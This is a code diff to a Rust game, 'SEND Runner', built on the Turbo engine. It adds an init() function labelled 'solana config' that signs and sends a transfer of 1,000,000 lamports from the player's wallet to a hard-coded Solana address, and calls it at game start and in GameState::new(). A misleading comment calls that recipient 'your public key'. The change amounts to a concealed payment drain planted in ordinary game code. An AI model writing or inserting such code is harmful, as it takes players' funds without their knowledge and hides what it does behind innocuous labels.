@@ -1,6 +1,38 @@
 mod state;
 use state::*;
+use turbo::solana::{self, solana_sdk::{instruction::{AccountMeta, Instruction}, transaction::Transaction}};
+use solana::{anchor, rpc, solana_sdk};
+use solana_sdk::pubkey::Pubkey;
 
+//solana config
+fn init (){
+    let pubkey = solana::signer();
+    let res = rpc::get_account(pubkey);
+    if !res.is_fetched() {
+        // The account isn't fetched yet.
+        // Here's where you can handle the loading state.
+        crate::println!("Account data not fetched");
+        return;
+    } 
+    // 1. Create the Transaction
+    let receive: Pubkey = "FyLhdnmLKSeWSkPqbxHFDAmCf2LY6cNricTpofGxF4mG".parse().unwrap();
+    let lamports_to_send = 1_000_000;
+    // Create the transfer instruction
+    let instruction = solana_sdk::system_instruction::transfer(
+        &pubkey, // Source public key (signer)
+        &receive, // Destination public key (your public key)
+        lamports_to_send, // Amount in lamports
+    );
+    let tx = Transaction::new_with_payer(&[instruction], Some(&pubkey));
+
+    // 2. Send the transaction
+    let did_send = solana::rpc::sign_and_send_transaction(&tx);
+    if did_send {
+        // The transaction was sent successfully
+    } else {
+        // The transaction failed to send
+    }
+}
 // Define the game configuration
 turbo::cfg! {r#"
     name = "SEND Runner"
@@ -41,12 +73,14 @@ turbo::init! {
         can_fire_multiple_borks: bool,
         last_game_over: u32,
     } = {
+        init();
         Self::new()
     }
 }
 
 impl GameState {
     pub fn new() -> Self {
+        init();
         Self {
             is_ready: false,
             dog_x: 20.0,
